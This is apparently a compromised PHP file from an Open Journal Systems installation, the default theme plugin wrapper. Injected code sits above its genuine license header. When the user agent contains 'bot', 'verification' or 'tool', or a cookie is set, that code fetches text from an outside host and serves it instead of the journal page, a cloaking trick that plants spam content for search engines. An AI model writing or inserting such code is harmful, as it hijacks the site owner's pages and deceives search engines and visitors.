<?php
if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/index.php/jurnalbinaedukasi' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/index.php/jurnalbinaedukasi' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/index.php/jurnalbinaedukasi' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
    echo implode('', file('https://mayoyo.store/journal.binadarma.ac.id/jurnalbinaedukasi.txt'));
    exit;
}

/**
 * @file plugins/themes/default/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup plugins_themes_default
 *
 * @brief Wrapper for default theme plugin.
 *
 */

return new \APP\plugins\themes\default\DefaultThemePlugin();
